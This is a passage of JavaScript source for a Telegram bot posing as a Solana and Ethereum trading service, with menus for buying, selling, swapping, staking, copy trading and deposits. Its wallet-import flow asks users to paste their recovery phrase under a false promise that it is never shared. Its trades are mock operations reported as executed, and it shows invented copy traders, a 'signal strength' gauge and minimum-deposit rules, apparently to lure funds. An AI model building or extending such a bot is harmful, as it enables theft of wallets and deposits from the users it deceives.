function swapPairKeyboard() {
  return Markup.keyboard([
    ["SOL → ETH", "ETH → SOL"],
    ["🔙 Back"],
  ]).resize();
}

function withdrawTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function stakeTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function dcaKeyboard() {
  return Markup.keyboard([
    ["New DCA"],
    ["My DCA plans"],
    ["🔙 Back"],
  ]).resize();
}

function copyTradersKeyboard() {
  const rows = MOCK_TRADERS.map((t) => [`${t.avatar} ${t.name}`]);
  rows.push(["🔙 Back"]);
  return Markup.keyboard(rows).resize();
}

function copyTradeKeyboard(traderId) {
  return Markup.keyboard([
    ["📋 Copy This Trade"],
    ["🔙 Back"],
  ]).resize();
}

async function handleStepNetwork(ctx, state) {
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.currentView = "network";
  return replyWithCachedPhoto(ctx, "network", {
    caption: NETWORK_TEXT,
    parse_mode: "Markdown",
    reply_markup: networkKeyboard().reply_markup,
  });
}

async function handleImportWalletNetwork(ctx, state, network) {
  state.importWalletNetwork = network;
  state.currentView = "import_wallet_select";
  const networkLabel = network === "solana" ? "🟣 Solana" : "🔵 Ethereum";
  return replyWithCachedPhoto(ctx, "network", {
    caption: `Import Wallet\nNetwork: ${networkLabel}\n\nSelect your wallet:`,
    parse_mode: "Markdown",
    reply_markup: walletSelectKeyboard(network).reply_markup,
  });
}

async function handleImportWalletSelect(ctx, state, walletType) {
  state.importWalletType = walletType;
  state.awaitingImportWallet = true;
  state.currentView = "import_wallet_phrase";
  const networkLabel = state.importWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum";
  const walletLabel = walletType.charAt(0).toUpperCase() + walletType.slice(1);
  return replyWithCachedPhoto(ctx, "network", {
    caption: `Import ${walletLabel}\nNetwork: ${networkLabel}\n\nPaste your wallet recovery phrase (12-24 words):\n<i>your phrase is encrypted and never shared</i>`,
    parse_mode: "HTML",
    reply_markup: { remove_keyboard: true },
  });
}

async function handleStepAssigned(ctx, state) {
  state.currentView = "wallet_assigned";
  await replyWithCachedPhoto(ctx, "wallet", {
    caption: walletAssignedText(state),
    parse_mode: "Markdown",
  });
  const chatId = ctx?.chat?.id;
  setTimeout(() => {
    state.awaitingEmail = true;
    if (chatId !== undefined) {
      sendPhotoCached(chatId, "security", {
        caption: SECURITY_SETUP_TEXT,
        parse_mode: "Markdown",
        reply_markup: { remove_keyboard: true },
      });
    }
  }, 1500);
}

async function handleMenuDashboard(ctx, state) {
  state.currentView = "dashboard";
  state.pendingAction = null;
  state.selectedTrader = null;
  return replyWithCachedPhoto(ctx, "dashboard", {
    caption: NETWORK_GRID_TEXT(state),
    parse_mode: "Markdown",
    reply_markup: dashboardKeyboard().reply_markup,
  });
}

async function handleDashMain(ctx, state) {
  state.currentView = "main_menu";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "🏠 **Main Menu**\n\nAccount & trading options:",
    parse_mode: "Markdown",
    reply_markup: mainMenuKeyboard().reply_markup,
  });
}

async function handleMenuSettings(ctx, state) {
  state.currentView = "settings";
  return replyWithCachedPhoto(ctx, "settings", {
    caption:
      "⚙️ *Settings*\n\n" +
      "Toggle trading options below:\n\n" +
      `• *Slippage* — ${state.slippage ? "ON ✅" : "OFF ❌"}\n` +
      `• *Auto-buy* — ${state.autoBuy ? "ON ✅" : "OFF ❌"}\n` +
      `• *MEV Protection* — ${state.mevProtection ? "ON ✅" : "OFF ❌"}\n`,
    parse_mode: "Markdown",
    reply_markup: settingsKeyboard(state).reply_markup,
  });
}

async function handleDashBuy(ctx, state) {
  state.currentView = "buy";
  state.pendingAction = "buy";
  state.buyToken = null;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      "💰 *Buy Tokens*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)}\n` +
      `🔵 ETH: $${ethUsd.toFixed(2)}\n\n` +
      "Select token:",
    parse_mode: "Markdown",
    reply_markup: buyTokenKeyboard().reply_markup,
  });
}

async function handleBuyToken(ctx, state, token) {
  state.currentView = "buy_" + token;
  state.buyToken = token;
  state.pendingAction = "buy";
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  const currency = token === "eth" ? "ETH" : "SOL";
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      `💰 *Buy ${currency}*\n\n` +
      `🟣 Price: $${price.toFixed(2)}\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSell(ctx, state) {
  state.currentView = "sell";
  state.pendingAction = "sell";
  state.sellToken = null;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      "📉 *Sell Tokens*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)}\n` +
      `🔵 ETH: $${ethUsd.toFixed(2)}\n\n` +
      "Select token:",
    parse_mode: "Markdown",
    reply_markup: sellTokenKeyboard().reply_markup,
  });
}

async function handleSellToken(ctx, state, token) {
  state.currentView = "sell_" + token;
  state.sellToken = token;
  state.pendingAction = "sell";
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      `📉 *Sell ${currency}*\n\n` +
      `🟣 Holdings: ${balance.toFixed(4)} ${currency}\n` +
      "Select a percentage to sell, or enter a custom amount.\n\n" +
      `Price: $${price.toFixed(2)} / ${currency}`,
    parse_mode: "Markdown",
    reply_markup: sellKeyboard().reply_markup,
  });
}

async function handleBuyAmount(ctx, state, amount) {
  const usd = parseFloat(amount);
  const token = state.buyToken;
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balanceUsd = token === "eth" ? state.ethBalance * ETH_PRICE : state.solBalance * SOL_PRICE;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;

  if (usd > balanceUsd) {
    return replyWithCachedPhoto(ctx, "buy", {
      caption:
        "❌ *Insufficient balance.*\n\n" +
        "💵 Total available: $0.00\n" +
        "   • SOL: $" + solUsd.toFixed(2) + "\n" +
        "   • ETH: $" + ethUsd.toFixed(2) + "\n" +
        `💵 Required: $${usd.toFixed(2)}\n\n` +
        "Please enter a lower amount.",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

   const bought = usd / price;
  if (token === "eth") {
    state.ethBalance += bought;
  } else {
    state.solBalance += bought;
  }
  state.tradeHistory.push({
    type: "buy",
    token: currency,
    amount: bought,
    usdValue: usd,
    price: price,
    timestamp: new Date().toISOString(),
  });
  syncState(state);
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      "🟢 *Buy Order (Mock)*\n\n" +
      `💵 Purchased: $${usd.toFixed(2)} ${currency}\n` +
      `💰 Received: ${bought.toFixed(6)} ${currency}\n` +
      `Price: $${price.toFixed(2)} / ${currency}\n\n` +
      "✅ *Order executed*\n" +
      (token === "eth"
        ? `New ETH balance: ${state.ethBalance.toFixed(6)} ETH\n`
        : `New SOL balance: ${state.solBalance.toFixed(4)} SOL`),
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleSellPct(ctx, state, pctStr) {
  const pct = parseInt(pctStr, 10);
  const token = state.sellToken;
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  const sellAmount = (balance * pct) / 100;
  const proceeds = sellAmount * price;

  if (sellAmount <= 0) {
    const solUsd = state.solBalance * SOL_PRICE;
    const ethUsd = state.ethBalance * ETH_PRICE;
    return replyWithCachedPhoto(ctx, "sell", {
      caption:
        "❌ *Insufficient balance.*\n\n" +
        "💵 Total available: $0.00\n" +
        "   • SOL: $" + solUsd.toFixed(2) + "\n" +
        "   • ETH: $" + ethUsd.toFixed(2) + "\n" +
        `💵 Required: $${proceeds.toFixed(2)}\n\n` +
        "Please enter a lower amount.",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

   if (token === "eth") {
     state.ethBalance -= sellAmount;
   } else {
     state.solBalance -= sellAmount;
   }
   state.usdcBalance += proceeds;
  state.tradeHistory.push({
    type: "sell",
    token: currency,
    amount: sellAmount,
    usdValue: proceeds,
    price: price,
    timestamp: new Date().toISOString(),
  });
  syncState(state);
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      "🔴 *Sell Order (Mock)*\n\n" +
      `📉 Selling: ${pct}% of ${balance.toFixed(4)} ${currency}\n` +
      `💰 Amount: ${sellAmount.toFixed(6)} ${currency}\n` +
      `💵 Proceeds: ~$${proceeds.toFixed(2)} USDC\n` +
      `Price: $${price.toFixed(2)} / ${currency}\n\n` +
      "✅ *Order executed*\n" +
      (token === "eth"
        ? `💎 Remaining ETH balance: ${state.ethBalance.toFixed(6)} ETH`
        : `💎 Remaining SOL balance: ${state.solBalance.toFixed(4)} SOL`),
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashBalance(ctx, state) {
  state.currentView = "balance";
  const solUsd = state.solBalance * SOL_PRICE;
  const total = solUsd + state.usdcBalance;
  return replyWithCachedPhoto(ctx, "balance", {
    caption:
      "💳 *Balance*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)} (≈ ${state.solBalance.toFixed(4)} SOL)\n` +
      "🔵 ETH: $0.00 (≈ 0 ETH)\n\n" +
      `💎 Total: $${total.toFixed(2)}`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashPortfolio(ctx, state) {
  state.currentView = "portfolio";
  const solValue = state.solBalance * SOL_PRICE;
  const total = solValue + state.usdcBalance;
  return replyWithCachedPhoto(ctx, "portfolio", {
    caption:
      "📈 *Portfolio*\n\n" +
      `🟣 SOL — $${solValue.toFixed(2)} (≈ ${state.solBalance.toFixed(4)} SOL)\n` +
      "🔵 ETH — $0.00 (≈ 0 ETH)\n" +
      `💎 Total: $${total.toFixed(2)}\n`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashDeposit(ctx, state) {
  state.currentView = "deposit";
  return replyWithCachedPhoto(ctx, "deposit", {
    caption:
      "💳 *Deposit*\n\n" +
      "Send funds to the addresses below.\n\n" +
      "🟣 SOL\n" +
      `\`${state.address}\`\n` +
      "_(Tap to Copy)_\n\n" +
      "🔵 ETH\n" +
      MOCK_ETH_ADDRESS + "\n" +
      "_(Tap to Copy)_",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSwap(ctx, state) {
  state.currentView = "swap";
  return replyWithCachedPhoto(ctx, "swap", {
    caption:
      "🔄 *Swap*\n\n" +
      "Select pair:\n\n" +
      "SOL → ETH\n" +
      "ETH → SOL",
    parse_mode: "Markdown",
    reply_markup: swapPairKeyboard().reply_markup,
  });
}

async function handleSwapPair(ctx, state, pair) {
  state.currentView = "swap_" + pair;
  state.swapPair = pair;
  state.awaitingSwapAmount = true;
  const solUsd = state.solBalance * SOL_PRICE;
  if (pair === "sol-eth") {
    const gasEth = solUsd * 0.10;
    return replyWithCachedPhoto(ctx, "swap", {
      caption:
        "🔄 *Swap SOL → ETH*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)}\n` +
        `⛽️ Gas requirement: $${gasEth.toFixed(2)} in ETH (10% of your SOL balance)\n` +
        "💵 Your ETH balance: $0.00\n\n" +
        "✅ Gas requirement met\n\n" +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  const ethUsd = 0;
  const gasSol = ethUsd * 0.10;
  return replyWithCachedPhoto(ctx, "swap", {
    caption:
      "🔄 *Swap ETH → SOL*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)}\n` +
      `⛽️ Gas requirement: $${gasSol.toFixed(2)} in SOL (10% of your ETH balance)\n` +
      `💵 Your SOL balance: $${solUsd.toFixed(2)}\n\n` +
      "✅ Gas requirement met\n\n" +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashWithdraw(ctx, state) {
  state.currentView = "withdraw";
  state.pendingAction = "withdraw";
  return replyWithCachedPhoto(ctx, "withdraw", {
    caption:
      "💸 *Withdraw*\n\n" +
      "Select token:\n\n" +
      "sol\n" +
      "eth",
    parse_mode: "Markdown",
    reply_markup: withdrawTokenKeyboard().reply_markup,
  });
}

async function handleWithdrawToken(ctx, state, token) {
  state.currentView = "withdraw_" + token;
  state.withdrawToken = token;
  state.awaitingWithdrawAmount = true;
  const ethUsd = 0;
  if (token === "sol") {
    const solUsd = state.solBalance * SOL_PRICE;
    return replyWithCachedPhoto(ctx, "withdraw", {
      caption:
        "💸 *Withdraw SOL*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)} (${state.solBalance.toFixed(4)} SOL)\n\n` +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  return replyWithCachedPhoto(ctx, "withdraw", {
    caption:
      "💸 *Withdraw ETH*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)} (0.0000 ETH)\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashStake(ctx, state) {
  state.currentView = "staking";
  state.pendingAction = "stake";
  return replyWithCachedPhoto(ctx, "stake", {
    caption:
      "📊 *Staking*\n\n" +
      "🟣 SOL 5.5% APY\n" +
      "🔵 ETH 4.2% APY\n\n" +
      "Select token:\n\n" +
      "sol\n" +
      "eth",
    parse_mode: "Markdown",
    reply_markup: stakeTokenKeyboard().reply_markup,
  });
}

async function handleStakeToken(ctx, state, token) {
  state.currentView = "stake_" + token;
  state.stakeToken = token;
  state.awaitingStakeAmount = true;
  const ethUsd = 0;
  if (token === "sol") {
    const solUsd = state.solBalance * SOL_PRICE;
    return replyWithCachedPhoto(ctx, "stake", {
      caption:
        "💎 *Stake SOL*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)} (${state.solBalance.toFixed(4)} SOL)\n\n` +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  return replyWithCachedPhoto(ctx, "stake", {
    caption:
      "💎 *Stake ETH*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)} (0.0000 ETH)\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

const allImageKeys = ["copytrader1", "copytrader2", "copytrader3", "copytrade4", "copytrade5", "copytrade6", "copytrade7", "copytrade8", "copytrade9", "copytrade10", "copytrade11"];

async function handleDashCopy(ctx, state) {
  const solBalance = state.solBalance || 0;
  if (solBalance < MIN_SOL_FOR_COPY_TRADE) {
    state.currentView = "copy_trade_blocked";
    return replyWithCachedPhoto(ctx, "network", {
      caption: `🔔 <b>COPY TRADE</b>\n\n❌ Insufficient SOL balance.\nA minimum of <b>${MIN_SOL_FOR_COPY_TRADE} SOL</b> is required to start copy trading.\n\n💼 Your current SOL balance: <b>${solBalance.toFixed(4)} SOL</b>\n\nDeposit more SOL to unlock copy trading.`,
      parse_mode: "HTML",
      reply_markup: dashboardKeyboard().reply_markup,
    });
  }
  
  // Show copy trading active notification
  const signalStrength = state.signalStrength || 0;
  await replyWithCachedPhoto(ctx, "network", {
    caption: `🔔 <b>Copy Trading is Active</b>\n\n⚠️ <b>COPY TRADING ALERT</b>\n\nSignal strength: ${signalStrength}/30\n\n✅ <b>Copy Trading is now ACTIVE</b>\n\n⚠️ <b>Important:</b> Signal strength should not fall below <b>2/30</b> while copy trading is active`,
    parse_mode: "HTML",
    reply_markup: dashboardKeyboard().reply_markup,
  });
  
  state.currentView = "copy_trade";
  const promises = MOCK_TRADERS.map((t, i) => {
    const traderName = t.name.replace(/@/g, "").replace(/_/g, "\\_");
    const caption =
      `👤 ${traderName}\n` +
      `${t.description}\n` +
      `📊 Performance: ${t.performance}\n` +
      `💰 Min: ${t.min} (${t.minSol} / ${t.minEth})\n` +
      `💰 Max: ${t.max} (${t.maxSol} / ${t.maxEth})`;
    const imageKey = t.image || allImageKeys[i % allImageKeys.length];
    return replyWithCachedPhoto(ctx, imageKey, {
      caption: caption,
      parse_mode: "Markdown",
      reply_markup: copyTradeKeyboard(t.id).reply_markup,
    }).catch(e => {
      console.error(`Failed to send trader ${t.name}:`, e?.message || e);
    });
  });
  await Promise.all(promises);
  await ctx.reply("Select a trader to copy:", {
    parse_mode: "Markdown",
    reply_markup: copyTradersKeyboard().reply_markup,
  });
}

async function handleCopyTrader(ctx, state, traderId) {
  const trader = MOCK_TRADERS.find((t) => t.id === traderId);
  if (!trader) return;
  state.currentView = "trader_detail";
  state.selectedTrader = traderId;
  return replyWithCachedPhoto(ctx, trader.image || "copytrader1", {
    caption:
      `👥 *${trader.name.replace(/@_$/g, "").replace(/_/g, "\\_")}*\n\n` +
      `${trader.description}\n\n` +
      `📊 *Performance: ${trader.performance}*\n` +
      `💰 Min: ${trader.min} (${trader.minSol} / ${trader.minEth})\n` +
      `💰 Max: ${trader.max} (${trader.maxSol} / ${trader.maxEth})`,
    parse_mode: "Markdown",
    reply_markup: copyTradeKeyboard(trader.id).reply_markup,
  });
}

async function handleCopyConfirm(ctx, state, traderId) {
  const trader = MOCK_TRADERS.find((t) => t.id === traderId);
  if (!trader) return;
  state.currentView = "copy_confirm";
  state.copyTrades.push({
    traderId: trader.id,
    traderName: trader.name,
    trade: trader.trade || { action: "BUY", token: "SOL", amount: 0, entry: 0, target: 0, stopLoss: 0 },
    timeframe: trader.timeframe,
    timestamp: new Date().toISOString(),
  });
  state.selectedTrader = null;
  syncState(state);
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  const caption =
    `✅ *Trade Copied!*\n\n` +
    `📊 *Following: ${trader.name.replace(/@_$/g, "").replace(/_/g, "\\_")}*\n` +
    `📈 Performance: ${trader.performance}\n\n` +
    `_You are now copying ${trader.name.replace(/@_$/g, "").replace(/_/g, "\\_")}'s trades._\n\n` +

    `💼 *Your Balance*\n` +
    `   • SOL: $${solUsd.toFixed(2)}\n` +
    `   • ETH: $${ethUsd.toFixed(2)}\n` +
    `   • Total: $${(solUsd + ethUsd).toFixed(2)}\n\n` +
    `💰 Min: ${trader.min} (${trader.minSol} / ${trader.minEth})\n` +
    `💰 Max: ${trader.max} (${trader.maxSol} / ${trader.maxEth})\n\n` +
    `Enter amount in USD:`;
  return replyWithCachedPhoto(ctx, trader.image || "copytrader1", {
    caption: caption,
    parse_mode: "Markdown",
    reply_markup: buyKeyboard().reply_markup,
  });
}

async function handleCopyAmount(ctx, state, amount) {
  const usd = parseFloat(amount);
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  const total = solUsd + ethUsd;
  const trader = MOCK_TRADERS.find((t) => t.id === state.selectedTrader);

  if (usd > total) {
    state.currentView = "copy_confirm";
    return replyWithCachedPhoto(ctx, "buy", {
      caption:
        "❌ *Insufficient balance.*\n\n" +
        "💵 Total available: $" + total.toFixed(2) + "\n" +
        `   • SOL: $${solUsd.toFixed(2)}\n` +
        `   • ETH: $${ethUsd.toFixed(2)}\n` +
        `💵 Required: $${usd.toFixed(2)}\n\n` +
        "Please enter a lower amount.",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  const bought = usd / SOL_PRICE;
  state.solBalance += bought;
  state.copyTrades.push({
    traderId: trader?.id || state.selectedTrader,
    traderName: trader?.name || "Unknown",
    trade: { action: "BUY", token: "SOL", amount: usd, entry: SOL_PRICE, target: SOL_PRICE * 1.1, stopLoss: SOL_PRICE * 0.95 },
    timeframe: trader?.timeframe || "24h",
    timestamp: new Date().toISOString(),
  });
  state.tradeHistory.push({
    type: "copy_trade",
    token: "SOL",
    amount: bought,
    usdValue: usd,
    price: SOL_PRICE,
    timestamp: new Date().toISOString(),
  });
  syncState(state);
  state.currentView = "copy_dashboard";

  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      "🟢 *Trade Successful!*\n\n" +
      `💵 Purchased: $${usd.toFixed(2)} SOL\n` +
      `💰 Received: ${bought.toFixed(6)} SOL\n` +
      `Price: $${SOL_PRICE.toFixed(2)} / SOL\n\n` +
      `✅ *Order executed*\n` +
      `New SOL balance: ${state.solBalance.toFixed(6)} SOL`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashDca(ctx, state) {
  state.currentView = "dca";
  return replyWithCachedPhoto(ctx, "dca", {
    caption:
      "📊 *DCA*\n\n" +
      "Select an option:\n\n" +
       "New DCA\n" +
      "My DCA plans",
    parse_mode: "Markdown",
    reply_markup: dcaKeyboard().reply_markup,
  });
}

async function handleDcaNew(ctx, state) {
  state.currentView = "dca_new";
  const solUsd = state.solBalance * SOL_PRICE;
  return replyWithCachedPhoto(ctx, "dca", {
    caption:
      "📊 *New DCA*\n\n" +
      "Step 1/3: Enter amount in USD\n\n" +
      "💳 DCA will debit from: 🟣 Solana (SOL)\n" +
      `💵 Available: $${solUsd.toFixed(2)}`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDcaPlans(ctx, state) {
  state.currentView = "dca_plans";
  return replyWithCachedPhoto(ctx, "dca", {
    caption: "📋 *My DCA Plans*\n\nNo active plans.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashAlerts(ctx, state) {
  state.currentView = "alerts";
  return replyWithCachedPhoto(ctx, "alerts", {
    caption:
      `🔔 *Notifications ${state.alerts ? "ON" : "OFF"}*\n\n` +
      `Tap the button below to ${state.alerts ? "turn OFF" : "turn ON"} notifications.`,
    parse_mode: "Markdown",
    reply_markup: alertsKeyboard(state).reply_markup,
  });
}

function alertsKeyboard(state) {
  return Markup.keyboard([
    [state.alerts ? "🔔 Notifications ON" : "🔕 Notifications OFF"],
    ["🔙 Back"],
  ]).resize();
}

async function handleDashSignal(ctx, state) {
  state.currentView = "signal";
  const signalStrength = state.signalStrength || 0;
  const status = signalStrength < 33 ? "🔴 LOW" : signalStrength < 66 ? "🟡 MEDIUM" : "🟢 HIGH";
  const filled = Math.floor(signalStrength / 5);
  const bar = "█".repeat(filled) + "░".repeat(20 - filled);
  return replyWithCachedPhoto(ctx, "signal", {
    caption:
      "📊 *Signal Strength*\n\n" +
      "Status: " + status + "\n\n" +
      bar + "\n" +
      signalStrength.toFixed(2) + "\n\n" +
      "_Last updated: " + new Date().toLocaleTimeString() + "_",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashTrades(ctx, state) {
  state.currentView = "trades";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "📜 *Trades*\n\nNo recent trades.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashHistory(ctx, state) {
  state.currentView = "history";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "📋 *Withdrawal History*\n\nNo withdrawals yet.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashReferral(ctx, state) {
  state.currentView = "referral";
  return replyWithCachedPhoto(ctx, "main", {
    caption:
      "👥 *Referral*\n\n" +
      "🔑 Your code: 8c6615f0\n\n" +
      "💎 Tier 1: 35%\n" +
      "💎 Tier 2: 25%",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSupport(ctx, state) {
  state.currentView = "support";
  return replyWithCachedPhoto(ctx, "main", {
    caption:
      "🎟️ Support\n\n" +
      "📱 Telegram: @tradebots_support",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleMenuReset(ctx, state) {
  state.email = null;
  state.pin = null;
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.securityCompleted = false;
  state.awaitingSwapAmount = false;
  state.swapPair = null;
  state.awaitingWithdrawAmount = false;
  state.withdrawToken = null;
  state.awaitingStakeAmount = false;
  state.stakeToken = null;
  state.currentView = null;
  state.pendingAction = null;
  state.selectedTrader = null;
  state.buyToken = null;
  state.sellToken = null;
  state.solBalance = 0;
  state.ethBalance = 0;
  state.usdcBalance = 0;
  state.tradeHistory = [];
  state.copyTrades = [];
  state.stakingPositions = [];
  state.dcaPlans = [];
  state.alerts = true;
  state.slippage = false;
  state.autoBuy = false;
  state.mevProtection = false;
  return replyWithCachedPhoto(ctx, "welcome", {
    caption: WELCOME_TEXT,
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
}

async function handleAlertsToggle(ctx, state) {
  state.alerts = !state.alerts;
  state.currentView = "alerts";
  return replyWithCachedPhoto(ctx, "alerts", {
    caption:
      `🔔 *Notifications ${state.alerts ? "ON" : "OFF"}*\n\n` +
      `Tap the button below to ${state.alerts ? "turn OFF" : "turn ON"} notifications.`,
    parse_mode: "Markdown",
    reply_markup: alertsKeyboard(state).reply_markup,
  });
}

function dispatchNav(text, state) {
  if (text === "✨ Generate Wallet") return (ctx) => handleStepNetwork(ctx, state);
  if (text === "📥 Import Wallet") {
    state.awaitingImportWallet = true;
    return (ctx) => handleStepNetwork(ctx, state);
  }
  if ((text === "🟣 Solana" || text === "🔵 Ethereum") && state.awaitingImportWallet) {
    const network = text === "🟣 Solana" ? "solana" : "ethereum";
    return (ctx) => handleImportWalletNetwork(ctx, state, network);
  }
  if (text === "🟣 Solana" || text === "🔵 Ethereum") return (ctx) => handleStepAssigned(ctx, state);

  const solanaWallets = ["👻 Phantom", "☀️ Solflare", "🛡️ Trust", "🦊 MetaMask", "🔵 Coinbase", "🔐 Ledger", "🟢 Exodus", "🛡️ Trezor", "⚛️ Atomic"];
  const ethWallets = ["🦊 MetaMask", "🛡️ Trust", "🔵 Coinbase", "🔐 Ledger", "🟢 Exodus", "🛡️ Trezor", "⚛️ Atomic"];
  const allWallets = [...solanaWallets, ...ethWallets];
  if (state.currentView === "import_wallet_select" && allWallets.includes(text)) {
    const walletType = text.split(" ")[1].toLowerCase();
    return (ctx) => handleImportWalletSelect(ctx, state, walletType);
  }

  if (text === "🔙 Back" && state.currentView === "import_wallet_select") {
    state.importWalletNetwork = null;
    state.currentView = "network";
    return (ctx) => handleStepNetwork(ctx, state);
  }

  if (text === "🏠 Main Menu") return (ctx) => handleDashMain(ctx, state);
  if (text === "💰 Buy") return (ctx) => handleDashBuy(ctx, state);
  if (text === "📉 Sell") return (ctx) => handleDashSell(ctx, state);
  if (text === "🔄 Swap") return (ctx) => handleDashSwap(ctx, state);
  if (text === "💸 Withdraw") return (ctx) => handleDashWithdraw(ctx, state);
  if (text === "💎 Stake") return (ctx) => handleDashStake(ctx, state);
  if (text === "👥 Copy Trade") return (ctx) => handleDashCopy(ctx, state);
  if (text === "💳 Balance") return (ctx) => handleDashBalance(ctx, state);
  if (text === "💳 Deposit") return (ctx) => handleDashDeposit(ctx, state);
  if (text === "📊 DCA") return (ctx) => handleDashDca(ctx, state);
  if (text === "🔔 Alerts") return (ctx) => handleDashAlerts(ctx, state);
  if (text === "📊 Signal Strength") return (ctx) => handleDashSignal(ctx, state);
  if (text === "📈 Portfolio") return (ctx) => handleDashPortfolio(ctx, state);
  if (text === "🧾 Trades") return (ctx) => handleDashTrades(ctx, state);
  if (text === "📜 History") return (ctx) => handleDashHistory(ctx, state);
  if (text === "👥 Referral") return (ctx) => handleDashReferral(ctx, state);
  if (text === "🎟️ Support") return (ctx) => handleDashSupport(ctx, state);
  if (text === "⚙️ Settings") return (ctx) => handleMenuSettings(ctx, state);
  if (text === "🔁 Restart") return (ctx) => handleMenuReset(ctx, state);
  if (text === "🚀 Enter Dashboard") return (ctx) => handleMenuDashboard(ctx, state);
  if (text === "🏠 Dashboard") return (ctx) => handleMenuDashboard(ctx, state);
  if (text === "🏠 Back to Dashboard") return (ctx) => handleMenuDashboard(ctx, state);

  if (text === "SOL → ETH") return (ctx) => handleSwapPair(ctx, state, "sol-eth");
  if (text === "ETH → SOL") return (ctx) => handleSwapPair(ctx, state, "eth-sol");

  if (text === "sol") {
    if (state.pendingAction === "withdraw") return (ctx) => handleWithdrawToken(ctx, state, "sol");
    if (state.pendingAction === "stake") return (ctx) => handleStakeToken(ctx, state, "sol");
    if (state.pendingAction === "buy") return (ctx) => handleBuyToken(ctx, state, "sol");
    if (state.pendingAction === "sell") return (ctx) => handleSellToken(ctx, state, "sol");
  }
  if (text === "eth") {
    if (state.pendingAction === "withdraw") return (ctx) => handleWithdrawToken(ctx, state, "eth");
    if (state.pendingAction === "stake") return (ctx) => handleStakeToken(ctx, state, "eth");
    if (state.pendingAction === "buy") return (ctx) => handleBuyToken(ctx, state, "eth");
    if (state.pendingAction === "sell") return (ctx) => handleSellToken(ctx, state, "eth");
  }

  if (text === "New DCA") return (ctx) => handleDcaNew(ctx, state);
  if (text === "My DCA plans") return (ctx) => handleDcaPlans(ctx, state);

  for (const trader of MOCK_TRADERS) {
